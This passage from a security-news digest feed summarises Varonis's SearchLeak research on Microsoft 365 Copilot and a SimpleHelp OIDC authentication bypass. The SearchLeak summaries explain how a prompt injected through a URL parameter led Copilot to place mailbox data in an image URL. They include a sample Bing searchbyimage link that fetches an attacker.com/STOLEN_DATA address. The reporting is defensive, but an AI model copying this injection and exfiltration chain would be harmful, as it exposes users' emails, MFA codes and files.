rather than only as a search string. The second is an HTML rendering race condition in which an image tag in streamed AI output can fire before the response is wrapped in code blocks. The third is a CSP bypass using Bing’s image-search endpoint, which is allowlisted and performs a server-side fetch of a user-supplied image URL.\u003c/p\u003e\n\n\u003cp\u003eIn the described attack flow, an attacker sends a victim a crafted link to m365.cloud.microsoft. When the victim clicks it, Copilot interprets the query parameter as instructions, searches the victim’s accessible data, and generates an image tag with extracted information embedded in the URL. The victim’s browser sends a request to Bing, and Bing’s backend fetches the attacker-controlled URL, causing the attacker’s server to log the stolen data in the request path.\u003c/p\u003e\n\n\u003cp\u003eThe affected parties discussed in the article are Microsoft 365 Copilot Enterprise users and organizations whose data is indexed and accessible through Copilot. The article does not identify any named threat actor using the technique. It states that the exposed data could include email titles and content, security codes, OTPs, password reset links, calendar and meeting details, meeting notes, SharePoint documents, OneDrive files, sensitive communications, and other organizational content.\u003c/p\u003e\n\n\u003cp\u003eVaronis emphasizes that the attack uses a trusted Microsoft domain and requires no plugins, special permissions, or second click. It also notes that traditional anti-phishing and URL protection tools may not block the link because it points to microsoft.com. Recommended defenses include monitoring Copilot Search URLs with suspicious q parameters, reviewing CSP allowlists for trusted domains that perform server-side fetches, and sanitizing AI streaming output at render time rather than after generation.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eVaronis Threat Labs uncovered SearchLeak, a three-stage vulnerability chain affecting Microsoft 365 Copilot Enterprise Search. The article says the chain turned Microsoft 365 Copilot Enterprise Search into a silent data exfiltration mechanism. Microsoft remediated the vulnerability under CVE-2026-42824 and assigned it a maximum severity rating of critical.\u003c/p\u003e\n\n\u003cp\u003eThe attack was described as requiring only one victim click on a crafted link. The link points to a trusted Microsoft domain, which the article says makes traditional anti-phishing and URL protection tools less likely to block or filter it. No plugins, special attacker permissions, or second click were required.\u003c/p\u003e\n\n\u003ch2 id=\"core-vulnerability-chain\"\u003eCore Vulnerability Chain\u003c/h2\u003e\n\n\u003cp\u003eSearchLeak combines one AI-specific issue with two classic web security weaknesses:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eParameter-to-Prompt Injection:\u003c/strong\u003e The q parameter in Microsoft 365 Copilot Enterprise Search is passed directly to Copilot as an executable prompt.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHTML rendering race condition:\u003c/strong\u003e An image tag in the streamed AI response can fire before the output sanitizer wraps the final response in code blocks.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCSP bypass via Bing SSRF:\u003c/strong\u003e Bing’s image-search endpoint is allowlisted by the Content Security Policy and performs a server-side fetch to an attacker-controlled URL.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe article stresses that each link in the chain is necessary. Without the P2P issue, the attacker could not get controlled HTML into the AI response. Without the race condition, the HTML would be neutralized. Without the Bing SSRF behavior, the browser’s Content Security Policy would block direct exfiltration to the attacker’s domain.\u003c/p\u003e\n\n\u003ch2 id=\"stage-1-parameter-to-prompt-injection\"\u003eStage 1: Parameter-to-Prompt Injection\u003c/h2\u003e\n\n\u003cp\u003eThe attack begins with Microsoft 365 Copilot Search accepting a q parameter in a URL such as:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ehttps://m365.cloud.microsoft/search/?auth=2\u0026amp;origindomain=microsoft365\u0026amp;q=\u0026lt;PROMPT\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eAccording to the article, this parameter is intended for natural language search queries, but Copilot interprets its contents not only as a search string but also as instructions. An attacker can craft a URL that tells Copilot to search the victim’s emails, extract information such as a title, and embed that information in an image URL.\u003c/p\u003e\n\n\u003cp\u003eThe victim does not need to type a prompt. The article describes the victim clicking a link, after which Copilot performs the search and follows the injected instructions.\u003c/p\u003e\n\n\u003ch2 id=\"stage-2-html-rendering-race-condition\"\u003eStage 2: HTML Rendering Race Condition\u003c/h2\u003e\n\n\u003cp\u003eMicrosoft’s mitigation for dangerous HTML in AI responses is described as wrapping output in code blocks so the browser treats it as text rather than markup. The article says this wrapping happens after Copilot finishes its thinking phase. During the streaming phase, raw HTML is temporarily rendered in the DOM.\u003c/p\u003e\n\n\u003cp\u003eThe article describes the sequence as follows:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eCopilot starts streaming a response that includes an \u003ccode\u003e\u0026lt;img\u0026gt;\u003c/code\u003e tag.\u003c/li\u003e\n\u003cli\u003eThe browser sees the image tag, renders it, and sends an HTTP request to the \u003ccode\u003esrc\u003c/code\u003e URL.\u003c/li\u003e\n\u003cli\u003eCopilot finishes generating the response.\u003c/li\u003e\n\u003cli\u003eThe guardrail wraps the output in \u003ccode\u003e\u0026lt;code\u0026gt;\u003c/code\u003e blocks.\u003c/li\u003e\n\u003cli\u003eThe request has already left the browser.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eVaronis characterizes this as a race condition because sanitization is applied as a post-processing step, while the browser renders streamed content incrementally.\u003c/p\u003e\n\n\u003ch2 id=\"stage-3-csp-bypass-through-bing-ssrf\"\u003eStage 3: CSP Bypass Through Bing SSRF\u003c/h2\u003e\n\n\u003cp\u003eThe article says the Content Security Policy on \u003ccode\u003em365.cloud.microsoft\u003c/code\u003e restricts which domains can be used for image loading. An attacker cannot simply point the image tag to an attacker-controlled domain because the browser would block it.\u003c/p\u003e\n\n\u003cp\u003eHowever, \u003ccode\u003e*.bing.com\u003c/code\u003e is allowlisted. The article explains that Bing’s Search by Image endpoint accepts an image URL parameter:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ehttps://www.bing.com/images/searchbyimage?cbir=sbi\u0026amp;imgurl=https://attacker.com/STOLEN_DATA/image.png\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eWhen Bing receives the request, its backend performs a server-side fetch of the supplied image URL. Because this fetch is made from Bing’s infrastructure rather than the victim’s browser, the browser’s CSP does not apply. The attacker’s server can then log the URL path containing the exfiltrated data.\u003c/p\u003e\n\n\u003ch2 id=\"full-attack-flow\"\u003eFull Attack Flow\u003c/h2\u003e\n\n\u003cp\u003eThe article describes the full flow as follows:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThe attacker sends the victim a crafted link through a channel such as email, Teams, Slack, or WhatsApp.\u003c/li\u003e\n\u003cli\u003eThe victim clicks the link and opens Microsoft 365 Copilot Search.\u003c/li\u003e\n\u003cli\u003eCopilot interprets the q parameter as instructions and searches the victim’s mailbox.\u003c/li\u003e\n\u003cli\u003eCopilot generates a response containing an image tag with extracted information embedded in the URL.\u003c/li\u003e\n\u003cli\u003eDuring streaming, the browser renders the image tag and sends a request to Bing.\u003c/li\u003e\n\u003cli\u003eBing’s server fetches the attacker-controlled URL with the extracted data in the path.\u003c/li\u003e\n\u003cli\u003eThe attacker logs a request such as \u003ccode\u003eGET /Your_Security_Code_847291/img.png\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe article says the victim may see Copilot thinking briefly and that the response may look unusual, but by then the data has already been sent.\u003c/p\u003e\n\n\u003ch2 id=\"affected-data-and-impact\"\u003eAffected Data and Impact\u003c/h2\u003e\n\n\u003cp\u003eBecause Copilot Enterprise operates with the user’s Microsoft Graph permissions, the article says an attacker could effectively inherit access to the data the victim can access, without authenticating as that user. The blast radius is not limited to personal data and can include organizational content available through Microsoft 365 Copilot Enterprise Search.\u003c/p\u003e\n\n\u003cp\u003eThe article lists possible exposed information including:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eEmail subject lines and content.\u003c/li\u003e\n\u003cli\u003eSecurity codes, OTPs, and password reset links.\u003c/li\u003e\n\u003cli\u003eConfidential communications.\u003c/li\u003e\n\u003cli\u003eCalendar meeting details, including attendees and agendas.\u003c/li\u003e\n\u003cli\u003eMeeting notes, locations, and times.\u003c/li\u003e\n\u003cli\u003eSharePoint documents.\u003c/li\u003e\n\u003cli\u003eOneDrive files.\u003c/li\u003e\n\u003cli\u003eEarnings reports, employee salary information, acquisition plans, and other private organizational files indexed by Copilot.\u003c/li\u003e\n\u003cli\u003eSensitive communication metadata.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe article also says the issue could enable account takeover and broader data theft scenarios without the victim knowing.\u003c/p\u003e\n\n\u003ch2 id=\"actors-and-attribution\"\u003eActors and Attribution\u003c/h2\u003e\n\n\u003cp\u003eThe article does not name any threat actor or group exploiting SearchLeak. It presents the findings as research from Varonis Threat Labs. The stakeholders explicitly discussed include Varonis Threat Labs, Microsoft, Microsoft 365 Copilot Enterprise users, organizations using Microsoft 365 Copilot Enterprise, and Bing as the allowlisted service used in the exfiltration path.\u003c/p\u003e\n\n\u003ch2 id=\"response-and-mitigation\"\u003eResponse and Mitigation\u003c/h2\u003e\n\n\u003cp\u003eMicrosoft patched SearchLeak and tracked it as CVE-2026-42824. The article states that Microsoft gave the issue a maximum severity rating of critical.\u003c/p\u003e\n\n\u003cp\u003eVaronis provides several defensive recommendations for organizations using Microsoft 365 Copilot Enterprise:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eMonitor for suspicious Copilot Search URLs, especially encoded payloads in the q parameter containing HTML tags or instructions to embed data in image URLs.\u003c/li\u003e\n\u003cli\u003eReview CSP allowlists, particularly for allowlisted domains that perform server-side fetches on user-supplied URLs.\u003c/li\u003e\n\u003cli\u003eTreat AI streaming output as untrusted and ensure sanitization happens at render time rather than as post-processing.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eFor users, the article recommends inspecting links before clicking, especially Microsoft 365 service links with long encoded query parameters. It also recommends reporting unusual Copilot behavior, such as Copilot searching email without an explicit user request.\u003c/p\u003e\n\n\u003ch2 id=\"significance\"\u003eSignificance\u003c/h2\u003e\n\n\u003cp\u003eThe article frames SearchLeak as an example of how AI systems can create new paths to exploit older web security issues. The AI-specific component is the Parameter-to-Prompt Injection, while the HTML race condition and SSRF behavior are described as classic vulnerability classes. The significance of the chain is that these issues become powerful together: a prompt injection causes Copilot to search sensitive organizational content, the streaming race allows HTML to fire, and the Bing SSRF path bypasses CSP-based blocking.\u003c/p\u003e\n","keyPoints":["Varonis Threat Labs uncovered SearchLeak, a three-stage vulnerability chain that turned Microsoft 365 Copilot Enterprise Search into a silent data exfiltration mechanism.","SearchLeak combined Parameter-to-Prompt Injection in the Copilot Search q parameter, an HTML rendering race condition during streamed AI output, and a CSP bypass using Bing’s image-search endpoint as an SSRF channel.","A victim clicking a crafted microsoft.com link could cause Copilot to search the victim’s mailbox, calendar, SharePoint, OneDrive, and other indexed organizational content and send extracted data to an attacker-controlled server.","The attack required no plugins, no special permissions, and no second click because the link used a trusted Microsoft domain and the exfiltration request was routed through an allowlisted Bing domain.","Microsoft remediated the vulnerability under CVE-2026-42824 and assigned it a maximum severity rating of critical."],"insights":["The attack chain shows that AI-specific flaws can make long-known web bugs exploitable in new contexts, because the P2P injection supplied attacker-controlled HTML that the older race condition and SSRF issues could then act on.","Post-processing AI output after generation was ineffective because Copilot streamed raw HTML to the browser before the sanitizer wrapped it in code blocks, making render-time sanitization a critical control.","CSP allowlists can become exfiltration channels when trusted domains such as Bing perform server-side fetches of user-supplied URLs, so allowlisted services need to be assessed for SSRF-like behavior.","Traditional phishing and URL-protection tools were less likely to block the attack because the victim-facing link pointed to a trusted Microsoft domain rather than an attacker-controlled site."],"referencedReports":[{"title":"CVE-2026-42824","url":"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-42824","publisher":"Microsoft Security Response Center","context":"The article states that Microsoft remediated SearchLeak under CVE-2026-42824 and assigned it a critical severity rating.","category":"","primary":false}],"body":"\u003cp\u003eVaronis Threat Labs uncovered SearchLeak, a three-stage vulnerability chain affecting Microsoft 365 Copilot Enterprise Search. The chain could turn Copilot Enterprise Search into a silent data exfiltration mechanism after a victim clicked a crafted link to a trusted Microsoft domain. Microsoft remediated the issue under CVE-2026-42824 and assigned it a maximum severity rating of critical.\u003c/p\u003e\n\n\u003cp\u003eThe attack combined Parameter-to-Prompt Injection, an HTML rendering race condition, and a CSP bypass via Bing server-side request forgery. A crafted q parameter in a Copilot Search URL could be interpreted as instructions, causing Copilot to search content the user could access and place extracted data into an image URL. During streamed output, raw HTML could briefly render before sanitization, allowing the browser to make a request to Bing, which then fetched an attacker-controlled URL.\u003c/p\u003e\n\n\u003cp\u003eThe article says the impact could include exposure of emails, security codes, calendar details, SharePoint documents, OneDrive files, and other indexed business content accessible to the victim. The attack required no plugins, special attacker permissions, or second click. Varonis recommends monitoring suspicious Copilot Search URLs, reviewing CSP allowlists, and treating AI streaming output as untrusted.\u003c/p\u003e\n"},{"n":15,"title":"SimpleHelp bug lets hackers create rogue remote support accounts","source":"bleepingcomputer.com","sourceColorIdx":10,"link":"https://www.bleepingcomputer.com/news/security/simplehelp-bug-lets-hackers-create-rogue-remote-support-accounts/","time":"20:06","priority":"SHOULD READ","score":84,"tldr":"A critical SimpleHelp flaw (CVE-2026-48558) lets unauthenticated attackers create privileged remote support technician accounts on servers using OIDC, potentially enabling endpoint access and script execution. Organizations should upgrade to SimpleHelp 5.5.16 or 6.0RC2, or restrict technician logins with IP allowlists if patching is not immediately possible.","briefOverview":"\u003cp\u003eA critical vulnerability in SimpleHelp remote management software allows unauthenticated attackers to create privileged technician accounts on servers using OpenID Connect authentication. The flaw is tracked as CVE-2026-48558 and affects SimpleHelp versions 5.5.15 and older, as well as 6.0 pre-release versions. SimpleHelp fixed the issue on June 9 with versions 5.5.16 and 6.0RC2.\u003c/p\u003e\n\n\u003cp\u003eHorizon3.ai researchers said the issue stems from how identity assertions from an OIDC identity provider are validated. When OIDC authentication is enabled, an attacker can create and log in as a new Technician user without going through MFA. By default, that Technician can perform privileged actions such as remoting into managed endpoints and executing scripts.\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability affects only a subset of vulnerable SimpleHelp servers, specifically those using OIDC or Azure AD OIDC with the required technician group configuration. Shodan shows about 14,000 SimpleHelp servers exposed to the internet, and Horizon3.ai’s sample suggests roughly 7.2% use OIDC authentication. Neither SimpleHelp nor Horizon3.ai has reported active exploitation, but organizations are urged to patch or apply mitigations such as IP-based allowlists for technician logins.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eA critical SimpleHelp vulnerability allows unauthenticated attackers to create privileged technician accounts on affected remote management servers. The flaw, tracked as CVE-2026-48558, impacts SimpleHelp versions 5.5.15 and older, as well as 6.0 pre-release versions. SimpleHelp released fixed versions 5.5.16 and 6.0RC2 on June 9.\u003c/p\u003e\n\n\u003cp\u003eHorizon3.ai researchers explained that the problem is tied to validation of identity assertions received from an OpenID Connect identity provider. If OIDC authentication is enabled, an attacker can create and log in as a new Technician user without completing the MFA process. Horizon3.ai researcher Zach Hanley said this Technician can, by default, perform privileged management activities including remoting into managed endpoints and executing scripts.\u003c/p\u003e\n\n\u003cp\u003eThe article emphasizes that CVE-2026-48558 does not affect every SimpleHelp server running a vulnerable version. Exploitation requires OIDC authentication to be enabled, at least one Technician Group to be associated with the OIDC provider, and the group setting “Allow group authenticated logins” to be enabled. The affected authentication options include generic OIDC and Azure AD OIDC, both described as common in large enterprises.\u003c/p\u003e\n\n\u003cp\u003eShodan results show around 14,000 SimpleHelp servers exposed to the public internet. Horizon3.ai’s analysis of a random sample suggests that roughly 7.2% are configured to use OIDC authentication. The researchers also found that “Allow group authenticated logins” is enabled in many cases.\u003c/p\u003e\n\n\u003cp\u003eOrganizations are advised to update to the latest SimpleHelp releases that address the vulnerability. If updating is not possible, the article says one mitigation is to restrict technician login sources using IP-based allowlists. Horizon3.ai also shared indicators of compromise, including suspicious new authenticated technician users and relevant entries in SimpleHelp server logs.\u003c/p\u003e\n\n\u003cp\u003eNeither SimpleHelp nor Horizon3.ai has reported evidence of active exploitation. However, the article notes that SimpleHelp has previously attracted significant threat actor interest. Because of that history, organizations are advised to apply the available fixes or mitigations without delay.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eA critical vulnerability in SimpleHelp remote management software allows unauthenticated attackers to create privileged technician accounts on certain affected servers. The flaw is tracked as CVE-2026-48558 and has received a critical severity rating. It affects SimpleHelp versions 5.5.15 and older, along with 6.0 pre-release versions.\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability applies to SimpleHelp servers that use OpenID Connect authentication. According to Horizon3.ai, the issue is caused by how identity assertions received from an OIDC identity provider are validated. When the required configuration is present, an attacker can create and log in as a new Technician user without going through the multi-factor authentication process.\u003c/p\u003e\n\n\u003ch2 id=\"technical-details\"\u003eTechnical Details\u003c/h2\u003e\n\n\u003cp\u003eHorizon3.ai said the vulnerability is tied to OIDC authentication, including both generic OIDC and Azure AD OIDC configurations. The researchers explained that an unauthenticated attacker can register and access a new Technician account when the affected authentication setup is enabled.\u003c/p\u003e\n\n\u003cp\u003eThe article quotes Horizon3.ai researcher Zach Hanley as saying that this Technician account can, by default, perform privileged management activities. These activities include:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eRemoting into managed endpoints.\u003c/li\u003e\n\u003cli\u003eExecuting scripts.\u003c/li\u003e\n\u003cli\u003ePerforming additional privileged management actions available to Technician users.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe article does not state that all SimpleHelp installations are vulnerable in practice. Instead, it describes a narrower exposure tied to both vulnerable software versions and specific OIDC-related configuration settings.\u003c/p\u003e\n\n\u003ch2 id=\"affected-versions-and-fixes\"\u003eAffected Versions and Fixes\u003c/h2\u003e\n\n\u003cp\u003eThe affected SimpleHelp versions are:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eSimpleHelp 5.5.15 and older.\u003c/li\u003e\n\u003cli\u003eSimpleHelp 6.0 pre-release versions.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eSimpleHelp fixed CVE-2026-48558 on June 9 by releasing:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eSimpleHelp 5.5.16.\u003c/li\u003e\n\u003cli\u003eSimpleHelp 6.0RC2.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eOrganizations are advised to update to the latest SimpleHelp releases that address the issue.\u003c/p\u003e\n\n\u003ch2 id=\"exploitation-prerequisites\"\u003eExploitation Prerequisites\u003c/h2\u003e\n\n\u003cp\u003eThe article states that several prerequisites must be met for exploitation to work. These are:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eOIDC authentication must be enabled.\u003c/li\u003e\n\u003cli\u003eAt least one Technician Group must be associated with the OIDC provider.\u003c/li\u003e\n\u003cli\u003eThe Technician Group must have “Allow group authenticated logins” enabled.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eBecause of these prerequisites, CVE-2026-48558 affects only a subset of vulnerable SimpleHelp deployments. The article specifically notes that the issue can affect deployments using either generic OIDC or Azure AD OIDC, both of which it describes as common in large enterprises.\u003c/p\u003e\n\n\u003ch2 id=\"exposure-and-scope\"\u003eExposure and Scope\u003c/h2\u003e\n\n\u003cp\u003eShodan results show about 14,000 SimpleHelp servers exposed to the public internet. Horizon3.ai analyzed a random sample and estimated that roughly 7.2% of those servers are configured to use OIDC authentication.\u003c/p\u003e\n\n\u003cp\u003eThe researchers also found that the “Allow group authenticated logins” setting is enabled in many cases. This setting is one of the required conditions for the exploit to work, according to the article.\u003c/p\u003e\n\n\u003ch2 id=\"detection-and-indicators\"\u003eDetection and Indicators\u003c/h2\u003e\n\n\u003cp\u003eHorizon3.ai shared indicators of compromise that can help detect possible exploitation. The article says defenders should look for new authenticated technician users with unknown or suspicious names or email addresses.\u003c/p\u003e\n\n\u003cp\u003eThe article also identifies SimpleHelp log locations that may contain relevant evidence:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e/opt/SimpleHelp/logs/server.log\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/opt/SimpleHelp/logs/\u0026lt;YYYYMMDD-HHMMSS\u0026gt;/server.log\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThese logs may contain technician registrations, email addresses, and configuration changes performed by rogue accounts.\u003c/p\u003e\n\n\u003ch2 id=\"mitigation-and-response\"\u003eMitigation and Response\u003c/h2\u003e\n\n\u003cp\u003eThe primary recommended response is to update SimpleHelp to the fixed releases. Organizations should install SimpleHelp 5.5.16 or 6.0RC2, depending on their deployment.\u003c/p\u003e\n\n\u003cp\u003eIf updating is not possible, the article cites one mitigation: restricting technician login sources using IP-based allowlists. This can limit where technician logins are allowed to originate.\u003c/p\u003e\n\n\u003ch2 id=\"exploitation-status\"\u003eExploitation Status\u003c/h2\u003e\n\n\u003cp\u003eNeither SimpleHelp nor Horizon3.ai has reported evidence of active exploitation. The article nevertheless urges organizations to apply fixes or mitigations without delay.\u003c/p\u003e\n\n\u003cp\u003eThe urgency is tied to the product’s history of attracting significant threat actor interest. The article references prior reporting about attackers exploiting SimpleHelp remote monitoring and management flaws to deploy Sliver malware and breach networks, but it does not report active exploitation of CVE-2026-48558.\u003c/p\u003e\n","keyPoints":["A critical SimpleHelp vulnerability tracked as CVE-2026-48558 allows unauthenticated attackers to create privileged technician accounts on servers using OpenID Connect authentication.","The flaw affects SimpleHelp versions 5.5.15 and older, as well as 6.0 pre-release versions, and was fixed in versions 5.5.16 and 6.0RC2 released on June 9.","Successful exploitation requires OIDC authentication to be enabled, at least one Technician Group to be associated with the OIDC provider, and “Allow group authenticated logins” to be enabled.","Horizon3.ai said a rogue Technician account can perform privileged management activities such as remoting into managed endpoints and executing scripts.","Neither SimpleHelp nor Horizon3.ai has reported evidence of active exploitation, but organizations are advised to apply fixes or mitigations without delay."],"insights":["The flaw does not affect all vulnerable SimpleHelp servers; it is limited to deployments using OIDC authentication with a Technician Group linked to the provider and “Allow group authenticated logins” enabled.","Horizon3.ai’s Shodan sampling suggests only about 7.2% of roughly 14,000 internet-exposed SimpleHelp servers use OIDC, narrowing the likely exposed population despite the large number of public servers.","The vulnerability bypasses the normal MFA flow because attackers can create and log in as a new Technician user through the affected OIDC configuration.","Defenders can look for suspicious new authenticated technician users and review SimpleHelp server logs for technician registrations, email addresses, and configuration changes tied to rogue accounts.","If immediate patching is not possible, restricting technician login sources with IP-based allowlists is an article-cited mitigation."],"referencedReports":[{"title":"CVE-2026-48558 SimpleHelp Authentication Bypass + IOCs","url":"https://horizon3.ai/attack-research/disclosures/cve-2026-48558-simplehelp-authentication-bypass-iocs/","publisher":"Horizon3.ai","context":"The article cites Horizon3.ai’s technical analysis explaining how the SimpleHelp OIDC validation flaw allows creation of rogue Technician accounts and provides indicators of compromise.","category":"","primary":false},{"title":"SimpleHelp Security Update 2026-05","url":"https://simple-help.com/security/simplehelp-security-update-2026-05","publisher":"SimpleHelp","context":"The article references SimpleHelp’s security update as the vendor advisory announcing fixed versions 5.5.16 and 6.0RC2 for the vulnerability.","category":"","primary":false}],"body":"\u003cp\u003eA critical vulnerability in SimpleHelp remote management software allows unauthenticated attackers to create privileged technician accounts on servers using OpenID Connect authentication. The flaw is tracked as CVE-2026-48558 and affects SimpleHelp versions 5.5.15 and older, as well as 6.0 pre-release versions. SimpleHelp fixed the issue on June 9 with versions 5.5.16 and 6.0RC2.\u003c/p\u003e\n\n\u003cp\u003eHorizon3.ai researchers said the issue stems from how identity assertions from an OIDC identity provider are validated. When OIDC authentication is enabled, an attacker can create and log in as a new Technician user without going through MFA. By default, that Technician can perform privileged actions such as remoting into managed endpoints and executing scripts.\u003c/p\u003e\n\n\u003cp\u003eThe vulnerability affects only a subset of vulnerable SimpleHelp servers, specifically those using OIDC or Azure AD OIDC with the required technician group configuration. Shodan shows about 14,000 SimpleHelp servers exposed to the internet, and Horizon3.ai’s sample suggests roughly 7.2% use OIDC authentication. Neither SimpleHelp nor Horizon3.ai has reported active exploitation, but organizations are urged to patch or apply mitigations such as IP-based allowlists for technician logins.\u003c/p\u003e\n"},{"n":23,"title":"One-Click Microsoft 365 Copilot Flaw Could Have Let Attackers Steal Emails, Files, and MFA Codes","source":"thehackernews.com","sourceColorIdx":8,"link":"https://thehackernews.com/2026/06/one-click-microsoft-365-copilot-flaw.html","time":"15:09","priority":"SHOULD READ","score":84,"tldr":"Researchers showed that a one-click flaw in Microsoft 365 Copilot Enterprise Search could have let attackers steal a user’s emails, files, calendar data, and even MFA codes by chaining prompt injection with rendering and CSP bypass issues. Microsoft has mitigated the backend flaw, and there is no evidence it was exploited in the wild.","briefOverview":"\u003cp\u003eVaronis Threat Labs demonstrated a one-click exfiltration path in Microsoft 365 Copilot Enterprise Search called SearchLeak. A victim clicking a trusted Microsoft link could have allowed an attacker to pull emails, calendar details, and indexed files through Copilot. Microsoft assigned CVE-2026-42824, marked it critical, and mitigated the issue on its backend.\u003c/p\u003e\n\n\u003cp\u003eSearchLeak chained three issues: Parameter-to-Prompt injection in the Copilot Enterprise Search q parameter, a rendering race condition, and a Content Security Policy bypass using Bing’s Search by Image endpoint. The attack could cause Copilot to search the signed-in user’s data, embed stolen text into an image URL, and route the exfiltration through Bing. Varonis presented a proof-of-concept and reported no observed exploitation.\u003c/p\u003e\n\n\u003cp\u003eThe article emphasizes that Copilot Enterprise can access whatever the signed-in user can reach through Microsoft Graph. That includes inbox contents such as one-time codes, MFA codes, and password-reset links, as well as calendar invites, meeting notes, and SharePoint or OneDrive files indexed by Copilot. Because Copilot Enterprise is managed by Microsoft, tenant admins cannot patch the failed components directly, but they can monitor suspicious Copilot Search URLs and tighten data-access governance.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eVaronis Threat Labs identified a Microsoft 365 Copilot Enterprise Search flaw they call SearchLeak, which could have allowed one-click data exfiltration. The attack began when a victim clicked a trusted Microsoft link, with no prompt, password, or second click required. Because the link pointed to a real microsoft.com domain, the article says traditional anti-phishing and URL filtering tools were unlikely to flag it. Microsoft assigned CVE-2026-42824, marked it critical, and mitigated it on the backend.\u003c/p\u003e\n\n\u003cp\u003eThe attack chain relied on three linked issues. First, the q parameter in the Copilot Enterprise Search URL accepted natural-language content that Copilot interpreted as instructions rather than only as a search string. Varonis described this as Parameter-to-Prompt injection. An attacker could craft a URL that told Copilot to search the mailbox, take an email title, and place it inside an image URL.\u003c/p\u003e\n\n\u003cp\u003eThe second issue was a race condition in the way Copilot output was rendered. Microsoft’s guardrail wrapped Copilot output in code blocks so the browser treated markup as text, but the wrapping occurred after Copilot finished generating. During streaming, the browser rendered the injected img tag and sent its request before sanitization neutralized the output. As a result, the outbound request could leave before the protection took effect.\u003c/p\u003e\n\n\u003cp\u003eThe third issue allowed the data to get past the page’s Content Security Policy. The CSP on m365.cloud.microsoft blocked images from arbitrary domains but allowlisted *.bing.com. Bing’s Search by Image endpoint accepted an image URL and fetched it server-side, allowing Bing to retrieve an attacker-controlled URL containing the stolen text in the path. The article describes Bing as becoming the exfiltration proxy because the browser’s CSP did not apply to Bing’s server-side request.\u003c/p\u003e\n\n\u003cp\u003eThe potential impact came from Copilot Enterprise’s access to whatever the signed-in user could reach through Microsoft Graph. The article highlights inbox items such as one-time codes, MFA codes, and password-reset links as time-sensitive targets. It also says the same access could reach calendar invites, meeting notes, and SharePoint or OneDrive files indexed by Copilot. Varonis reported a proof-of-concept rather than observed exploitation.\u003c/p\u003e\n\n\u003cp\u003eThe article connects SearchLeak to earlier AI-related data leak patterns, including Varonis researcher Dolev Taler’s Reprompt attack against Copilot Personal and Aim Security’s EchoLeak, CVE-2025-32711, disclosed in 2025. It states that SSRF and sanitizer races are old bug classes, while prompt injection is the new part that makes them reachable again. Since Microsoft mitigated the flaw as a managed-service backend issue, tenant admins cannot patch or reconfigure the failed components themselves. The article recommends watching for Copilot Search URLs with encoded payloads or HTML in the q parameter, monitoring unusual outbound requests to Bing image endpoints, and tightening data-access governance so Copilot indexes less.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eVaronis Threat Labs demonstrated a one-click data exfiltration path in Microsoft 365 Copilot Enterprise Search called SearchLeak. According to the article, a single click on a trusted Microsoft link could have let an attacker pull emails, calendar details, and indexed files from Microsoft 365 Copilot Enterprise Search.\u003c/p\u003e\n\n\u003cp\u003eThe attack did not require a prompt, password, or second click from the victim. The link pointed to a real microsoft.com domain, which the article says made it unlikely that traditional anti-phishing and URL filtering tools would flag it.\u003c/p\u003e\n\n\u003cp\u003eMicrosoft assigned the issue CVE-2026-42824 and marked it critical. The article notes that CVSS scores differed, with Microsoft assigning 6.5 and the National Vulnerability Database assigning 7.5. Microsoft mitigated the flaw on its backend, and Varonis presented a proof-of-concept rather than observed exploitation.\u003c/p\u003e\n\n\u003ch2 id=\"attack-chain\"\u003eAttack chain\u003c/h2\u003e\n\n\u003cp\u003eSearchLeak chained three issues into a single exfiltration path:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eParameter-to-Prompt injection in the Copilot Enterprise Search q parameter.\u003c/li\u003e\n\u003cli\u003eA race condition in how Copilot output was rendered and sanitized.\u003c/li\u003e\n\u003cli\u003eA Content Security Policy bypass using Bing’s Search by Image endpoint.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eMicrosoft’s advisory described the flaw as a command injection that can expose information over a network. The article explains that, in practice, the attack combined one AI-specific weakness with two older web bug classes.\u003c/p\u003e\n\n\u003ch2 id=\"parameter-to-prompt-injection\"\u003eParameter-to-Prompt injection\u003c/h2\u003e\n\n\u003cp\u003eThe entry point was the q parameter in the Copilot Enterprise Search URL. This parameter is intended for a natural-language query, but the article says Copilot read the content there as 